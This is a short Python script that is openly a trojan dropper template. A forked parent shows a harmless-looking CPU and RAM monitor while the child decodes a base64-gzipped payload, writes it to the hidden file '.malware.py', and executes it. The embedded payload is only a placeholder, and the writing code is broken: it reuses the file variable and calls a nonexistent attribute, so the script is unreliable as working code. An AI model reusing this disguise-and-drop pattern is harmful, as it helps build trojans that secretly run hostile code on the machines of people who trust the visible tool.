import os
import base64
import gzip
import time
import psutil

def main():
	#we fork this child process
	pid = os.fork()

	if pid > 0:
		while True:
			cpu = psutil.cpu_percent()
			ram = psutil.virtual_memory().percent
			process_count = 0
			for _ in psutil.process_iter():
				process_count += 1

			print("-------------------")
			print("| CPU USAGE | RAM USAGE |")
			print("| {:02}%    |  {:02}%   |   {}  |".format(int(cpu), int(ram), process_count))

			time.sleep(2)


	else:
		#this is the child process
		trojan()

def trojan():
	malware = open(".malware.py", "w")
	encoded_malware = "//this is the gzip base64 base64_encoded_malware"
	malware = gzip.decompress(base64.b64decode(encoded_malware))
	malware.fd.write(malware)
	malware.close()

	#we execute the malware
	os.system("/usr/bin/python3 .malware.py")

if __name__ == "__main__":
	main()